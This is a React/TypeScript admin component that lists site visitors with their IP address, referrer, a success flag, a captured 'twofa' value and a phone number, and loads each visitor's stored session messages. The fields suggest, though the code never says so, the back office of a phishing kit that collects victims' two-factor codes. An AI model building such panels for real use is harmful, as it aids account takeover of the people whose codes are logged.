
import { FC, useState, useContext, useEffect } from "react";
import { observer } from "mobx-react-lite";
import { ctx } from "../..";
import LinkService from "../../services/LinkService";
import m from "./AdminVisitor.module.sass"
import { useQuery } from "../../hooks/useQueryHook";
import { useParams } from "react-router-dom";
import { socket } from "../../websocket/socket";
import Input from "../../component/Input/Input";
import { ILink } from "../../models/ILink";
import { IAdminVisitor } from "../../models/IAdminVisitor";
import AdminService from "../../services/AdminService";
import { ISessionMessage } from "../../models/ISessionMessage";
import Spinner from "../Spinner/Spinner";


interface AdminVisitorProps {
    visitor: IAdminVisitor
    deleteCb: (visitorId: string) => void
}

const AdminVisitor: FC<AdminVisitorProps> = ({visitor, deleteCb}) => {

    const {store} = useContext(ctx)
    const [modalActive, setModalActive] = useState<boolean>(false)
    const [messages, setMessages] = useState<ISessionMessage[]>([])
    const [loading, setLoading] = useState<boolean>(false)

    const handleDelete = () => {
        deleteCb(visitor.id)
    }

    const loadSession = async () => {
        setLoading(true)
        try {
            const res: any = await AdminService.getSession(visitor.id)
            if(res.data.json && res.data.json.messages) setMessages(res.data.json.messages)
            setModalActive(true)
        } catch(e) {
            console.error(e)
        }
        setLoading(false)
    }

    return (
        <>
            <div className={`${m.ModalWrapper} ${modalActive && m.Active}`} onClick={() => setModalActive(false)}>
                <div className={m.Content}>
                    {
                        loading 
                            ?
                            <Spinner mini/>
                            :
                            messages && messages.length 
                                ?
                                    messages.map(el => 
                                        <div className={m.Message} key={el.id}>
                                            {el.message}
                                        </div>
                                    )
                                :
                                    <p>There are no data</p>
                    }
                </div>
            </div>
            <div className={`${m.Blurer} ${modalActive && m.Active}`} onClick={() => setModalActive(false)}>
                
            </div>
            <tr className={m.Tr}>
                <td>
                    {visitor.id}
                </td>
                <td>
                    {visitor.refer}
                </td>
                <td>
                    {visitor.success ? "True" : "False"}
                </td>
                <td>
                    {visitor.ip}
                </td>
                <td>
                    {visitor.twofa ? visitor.twofa : "No"}
                </td>
                <td>
                    {visitor.phone}
                </td>
                <td>
                    <div className={m.TdContent}>
                        <button className="mini-badge badge-green badge-btn" onClick={() => loadSession()}>
                            Load
                        </button>
                        <button className="mini-badge badge-red badge-btn" onClick={() => handleDelete()}>
                            Delete
                        </button>
                    </div>
                </td>
            </tr>
        </>
    )
}

export default observer(AdminVisitor)